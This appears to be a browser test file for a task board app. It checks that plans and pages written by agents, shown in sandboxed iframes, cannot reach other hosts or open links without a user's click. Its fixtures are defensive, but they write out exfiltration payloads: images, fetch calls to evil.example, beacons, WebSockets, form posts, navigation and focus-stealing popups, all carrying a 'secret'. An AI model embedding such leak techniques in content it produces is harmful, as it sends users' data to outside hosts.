// A plan or artifact an agent wrote can't load anything from another host (HA-266): its frame's policy (FRAME_CSP in
// src/components/task/htmlFrame.ts) and the board's frame-src (index.html) let it load only its own inline scripts and
// styles, data: URLs and libraries from the CDNs. What this counts is requests: in Chromium (not Electron) a frame load
// the policy refuses still looks the host up and connects to it (TLS SNI included), and WebRTC isn't held by the policy,
// so a page can still send data in a hostname (HA-269).
import assert from "node:assert/strict";
import http from "node:http";
import { afterAll, beforeAll, test } from "vite-plus/test";
import { demoProject, startServer, withBrowser } from "./harness.mjs";

let server, project, plan, outside, hits;
beforeAll(async () => {
  server = startServer();
  project = await demoProject(server);
  plan = (await server.api("GET", `/projects/${project.id}/tasks`)).find((t) => t.labels.includes("plan"));
  // Another host, as far as the board is concerned (another port): it counts what reaches it, whether or not the
  // browser's request interception sees it.
  hits = [];
  outside = http.createServer((req, res) => {
    hits.push(req.url);
    res.writeHead(200, { "content-type": "text/plain", "access-control-allow-origin": "*" }).end("ok");
  });
  await new Promise((done) => outside.listen(0, "127.0.0.1", done));
});
afterAll(() => {
  outside?.close();
  server?.stop();
});

/** What a page tries, to send `secret` out: everything here goes to `out` (the counting server) or evil.example. */
const leaks = (out) => `
<p id="secret">secret</p>
<img src="${out}/img?d=secret"><img src="https://evil.example/img?d=secret">
<link rel="stylesheet" href="${out}/css">
<div style="background: url(${out}/bg)">bg</div>
<iframe src="${out}/frame"></iframe>
<form id="post" action="${out}/form" method="post"><input name="d" value="secret"></form>
<script>
  window.blocked = [];
  document.addEventListener("securitypolicyviolation", (e) => blocked.push(e.violatedDirective + " " + e.blockedURI));
  fetch("${out}/fetch?d=secret").catch(() => {});
  fetch("https://evil.example/fetch?d=secret").catch(() => {});
  navigator.sendBeacon?.("${out}/beacon", "secret");
  try { new WebSocket("${out.replace("http", "ws")}/ws"); } catch {}
  new Image().src = "${out}/late-img?d=secret";
  addEventListener("load", () => {
    // A library from a CDN still loads (answered by the check's route).
    const s = document.createElement("script");
    s.src = "https://cdn.jsdelivr.net/npm/fake-lib@1/lib.js";
    document.head.append(s);
  });
</script>
<ia-html><template><p>nested</p><img src="${out}/nested-img"><script>fetch("${out}/nested-fetch").catch(() => {}); parent.postMessage({ nested: "ran" }, "*");</script></template></ia-html>`;

async function openDocument(ui, content) {
  const at = new Date().toISOString();
  await ui.page.route(new RegExp(`/tasks/${plan.id}/document(\\?.*)?$`), (route) =>
    route.fulfill({
      json: {
        task_type: "plan",
        file: "plan.html",
        versions: [{ version: 1, open: false, created_at: at, updated_at: at, size: content.length }],
        version: 1,
        content,
      },
    }),
  );
  await ui.run([`goto /p/${project.id}?task=${plan.id}`, "wait css=iframe"]);
  // The panel can show the document more than once as it loads: wait for one that stays.
  const deadline = Date.now() + 10000;
  for (;;) {
    const frame = ui.page.frames().find((f) => f.parentFrame() === ui.page.mainFrame() && f.url() === "about:srcdoc");
    const marked = await frame?.evaluate(() => document.readyState === "complete" && (window.iaCheckMark = true)).catch(() => false);
    await ui.page.waitForTimeout(500);
    if (marked && (await frame.evaluate(() => window.iaCheckMark === true).catch(() => false))) return frame;
    if (Date.now() > deadline) throw new Error("the document's frame didn't settle");
  }
}

// A plan in the theme, and a whole page of its own (shown as an artifact is).
for (const [name, wrap] of [
  ["a plan", (body) => `<h1>Leaky plan</h1>${body}`],
  ["a whole page", (body) => `<!doctype html><html lang="en"><head><title>Leaky</title></head><body><h1>Leaky page</h1>${body}</body></html>`],
]) {
  test(`${name} an agent wrote reaches no other host: no images, fetch, frames, forms or navigation; CDN libraries still load`, async () => {
    hits.length = 0;
    const out = `http://127.0.0.1:${outside.address().port}`;
    // The policy's refusals are console errors.
    await withBrowser(server, { allowErrors: [/Content Security Policy|violates|Refused to|Fetch API cannot load|net::ERR_BLOCKED/] }, async (ui) => {
      const { page } = ui;
      const external = [];
      await page.route(/^https?:\/\//, (route) => {
        const url = route.request().url();
        if (url.startsWith(server.url)) return route.continue();
        external.push(url);
        if (url.startsWith("https://cdn.jsdelivr.net/")) return route.fulfill({ contentType: "text/javascript", body: "window.fakeLib = 'loaded'" });
        return route.fulfill({ body: "ok" });
      });
      const frame = await openDocument(ui, wrap(leaks(out)));
      await frame.waitForFunction(() => window.fakeLib === "loaded", null, { timeout: 10000 });
      assert.equal(await frame.evaluate(() => document.compatMode), "CSS1Compat", "the page stays in standards mode");
      if (name === "a plan") {
        // The <ia-html>'s frame is there (a srcdoc frame, which the policy's frame-src doesn't hold).
        const nested = frame.childFrames().find((f) => f.url() === "about:srcdoc");
        assert.ok(nested, "the <ia-html> frame");
        await nested.waitForFunction(() => document.querySelector("p")?.textContent === "nested", null, { timeout: 5000 });
      }
      const blocked = await frame.evaluate(() => window.blocked);
      assert.ok(blocked.some((b) => b.startsWith("img-src")) && blocked.some((b) => b.startsWith("connect-src")), JSON.stringify(blocked));
      // Posting a form, or the frame navigating itself, to another host goes nowhere (the policy's form-action and the
      // board's frame-src: the frame is left on an error page).
      await frame.evaluate(() => document.getElementById("post").requestSubmit());
      await page.waitForTimeout(500);
      await page
        .frames()[1]
        .evaluate((out) => (location.href = `${out}/nav?d=secret`), out)
        .catch(() => {});
      await page.waitForTimeout(1000);
      assert.deepEqual(hits, [], `requests reached the other host (blocked: ${JSON.stringify(blocked)})`);
      assert.deepEqual(
        external.filter((u) => !u.startsWith("https://cdn.jsdelivr.net/")),
        [],
        "requests left the board",
      );
    });
  });
}

test("a link in a plan, or in its <ia-html>, opens in a new tab after the user's click in it, rather than in the frame", async () => {
  await withBrowser(server, {}, async (ui) => {
    const { page } = ui;
    await page.context().route(/^https:\/\/example\.com\//, (route) => route.fulfill({ contentType: "text/html", body: "elsewhere" }));
    const frame = await openDocument(
      ui,
      `<h1>Links</h1><p><a id="link" href="https://example.com/plan">a link</a> <button id="open" onclick="window.open('https://example.com/button')">open</button></p><ia-html><template><a id="inner" href="https://example.com/inner" target="_top">inner</a></template></ia-html>`,
    );
    for (const [where, id, url] of [
      [frame, "#link", "https://example.com/plan"],
      [frame, "#open", "https://example.com/button"],
      [page.frameLocator("iframe").frameLocator("ia-html iframe"), "#inner", "https://example.com/inner"],
    ]) {
      const opened = page.context().waitForEvent("page", { timeout: 5000 });
      await where.locator(id).click();
      const tab = await opened;
      await tab.waitForURL(url);
      await tab.close();
    }
    assert.equal(frame.url(), "about:srcdoc");
    assert.equal(await page.getByText("opens a link").count(), 0);
  });
});

/**
 * Opens a plan that asks the board to open links (and tries to open them itself) as it loads, then keeps taking the
 * focus and asking every 200ms, and waits until the board's activation from Playwright's queries has run out and the
 * frame has asked a few times with the focus. `peek` and `until` read the board without a user gesture.
 */
async function leakyPlan(ui) {
  const { page } = ui;
  const opened = [];
  page.context().on("page", (p) => opened.push(p.url()));
  await page.context().route(/^https:\/\/example\.com\//, (route) => route.fulfill({ contentType: "text/html", body: "elsewhere" }));
  // What the board sees, as it happens: each link the frame asks it to open (and whether the board had the user's
  // activation then), each window.open of its own, and the user's last pointer down in it.
  await page.addInitScript(() => {
    if (window !== top) return;
    const seen = (window.iaCheck = { asks: [], opens: [], input: -Infinity });
    addEventListener("message", (e) => {
      if (typeof e.data?.iaOpen === "string") seen.asks.push({ at: performance.now(), active: navigator.userActivation.isActive });
    });
    const open = window.open;
    window.open = function (url, ...rest) {
      seen.opens.push({ url: String(url), at: performance.now() });
      return open.call(this, url, ...rest);
    };
    addEventListener("pointerdown", (e) => e.isTrusted && (seen.input = performance.now()), true);
  });
  // Playwright's queries (evaluate, locators, waitFor) run as a user gesture, which activates the board without any
  // input in it, so while the frame has the focus they'd let its next ask open (HA-272). Reads in the board until the
  // user's input in it go through CDP instead, which doesn't.
  const cdp = await page.context().newCDPSession(page);
  const peek = async (expression) => {
    const { result, exceptionDetails } = await cdp.send("Runtime.evaluate", { expression, returnByValue: true });
    if (exceptionDetails) throw new Error(`${expression}: ${exceptionDetails.exception?.description ?? exceptionDetails.text}`);
    return result.value;
  };
  const until = async (expression, what) => {
    const deadline = Date.now() + 20000;
    for (;;) {
      const value = await peek(expression);
      if (value) return value;
      if (Date.now() > deadline) throw new Error(`timed out waiting for ${what}: ${JSON.stringify(await peek("iaCheck"))}`);
      await page.waitForTimeout(100);
    }
  };
  const content = `<h1>Leaky</h1><a id="blank" href="https://example.com/blank?d=secret" target="_blank">blank</a><input id="steal">
<script>
  // The browser's window.open (the board's comes after the page's scripts), and a fresh frame's, as it loads.
  window.open("https://example.com/load?d=secret");
  const f = document.createElement("iframe");
  document.body.append(f);
  try { f.contentWindow.open.call(window, "https://example.com/native?d=secret"); } catch {}
  // A click of its own on a link, and one the board's handler doesn't see.
  document.getElementById("blank").addEventListener("click", (e) => e.stopPropagation());
  document.getElementById("blank").click();
  // Then it keeps taking the focus and asking the board.
  setInterval(() => { window.focus(); document.getElementById("steal").focus(); window.open("https://example.com/later?d=secret"); }, 200);
</script>`;
  const at = new Date().toISOString();
  await page.route(new RegExp(`/tasks/${plan.id}/document(\\?.*)?$`), (route) =>
    route.fulfill({
      json: {
        task_type: "plan",
        file: "plan.html",
        versions: [{ version: 1, open: false, created_at: at, updated_at: at, size: content.length }],
        version: 1,
        content,
      },
    }),
  );
  await ui.run([`goto /p/${project.id}?task=${plan.id}`, "wait css=iframe"]);
  // Let the activation from the queries above run out, untouched (the frame's asks until then may open), and the
  // frame take the focus.
  const quiet = await until("!navigator.userActivation.isActive && performance.now()", "the board's activation to run out");
  await until(`iaCheck.asks.filter((a) => a.at > ${quiet}).length >= 3 && document.activeElement?.tagName === "IFRAME"`, "the frame's asks");
  assert.deepEqual(
    opened.filter((u) => !u.includes("/later")),
    [],
    "the frame opened nothing itself",
  );
  assert.deepEqual(await peek(`iaCheck.opens.filter((o) => o.at > ${quiet})`), [], "the board opened nothing without the user's input");
  assert.equal(await peek(`document.body.innerText.includes("opens a link")`), false, "nor asked");
  // The middle of the plan's composer, in the board.
  const composer = await peek(`(() => {
    const r = document.querySelector('[placeholder="Ask for changes to the plan…"]').getBoundingClientRect();
    return { x: r.x + r.width / 2, y: r.y + r.height / 2 };
  })()`);
  return { opened, quiet, peek, until, cdp, composer };
}

// The desktop app (Electron) has no popup blocker: a popup the frame opened as it loaded went straight to the browser,
// with whatever the page put in its URL.
test("a plan can't open a link without the user's click in it: the board asks instead, also after the frame takes the focus", async () => {
  await withBrowser(server, { allowErrors: [/allow-popups/] }, async (ui) => {
    const { page } = ui;
    const { opened, quiet, peek, until, composer } = await leakyPlan(ui);
    // The user clicks the composer and types: the frame takes the focus back, while the board has the user's activation.
    await page.mouse.click(composer.x, composer.y);
    await page.keyboard.type("hello");
    const input = await peek("iaCheck.input");
    assert.ok(input > quiet, "the click reached the board");
    await until(`iaCheck.asks.filter((a) => a.at > ${input}).length >= 3`, "the frame's asks after the user's input");
    assert.deepEqual(await peek(`iaCheck.opens.filter((o) => o.at > ${quiet})`), [], "nothing opened after the user's input in the board");
    assert.ok(await peek(`iaCheck.asks.some((a) => a.at > ${input} && a.active)`), "the board had the user's activation as the frame asked");
    assert.equal(await peek("document.activeElement?.tagName"), "IFRAME", "the frame took the focus");
    // The board asks, showing the link, and opens it only from its own button.
    await until(`document.body.innerText.includes("opens a link")`, "the board to ask");
    assert.equal(await peek(`document.querySelector("[role=alert] code")?.innerText`), "https://example.com/later?d=secret");
    assert.deepEqual(await peek(`iaCheck.opens.filter((o) => o.at > ${quiet})`), []);
    assert.deepEqual(
      opened.filter((u) => !u.includes("/later")),
      [],
    );
  });
});

// A touch (or pen) activates the page as it's lifted, not as it comes down: a touch held on the board gave an activation
// that outlasted the board's 5.5s from its pointer down, so the frame's asks then opened at once (HA-274).
test("a touch held on the board doesn't let a plan open a link once the board's activation outlasts the touch's start", async () => {
  await withBrowser(server, { touch: true, allowErrors: [/allow-popups/] }, async (ui) => {
    const { page } = ui;
    const { opened, quiet, peek, until, cdp, composer } = await leakyPlan(ui);
    // A touch held for 3s on the composer.
    const point = [{ x: composer.x, y: composer.y }];
    await cdp.send("Input.dispatchTouchEvent", { type: "touchStart", touchPoints: point, timestamp: Date.now() / 1000 });
    await page.waitForTimeout(3000);
    await cdp.send("Input.dispatchTouchEvent", { type: "touchEnd", touchPoints: [], timestamp: Date.now() / 1000 });
    const input = await peek("iaCheck.input");
    assert.ok(input > quiet, "the touch reached the board");
    // Its activation, from its end, runs out (well after 5.5s from its start).
    const active = `iaCheck.asks.filter((a) => a.at > ${input} && a.active)`;
    await until(`${active}.length && iaCheck.asks.some((a) => a.at > ${active}.at(-1).at && !a.active)`, "the touch's activation to run out");
    assert.ok(await peek(`${active}.some((a) => a.at > ${input} + 5500)`), "the frame asked late in the touch's activation");
    assert.deepEqual(await peek(`iaCheck.opens.filter((o) => o.at > ${quiet})`), [], "nothing opened after the touch on the board");
    assert.equal(await peek("document.activeElement?.tagName"), "IFRAME", "the frame took the focus");
    await until(`document.body.innerText.includes("opens a link")`, "the board to ask");
    assert.deepEqual(
      opened.filter((u) => !u.includes("/later")),
      [],
    );
  });
});
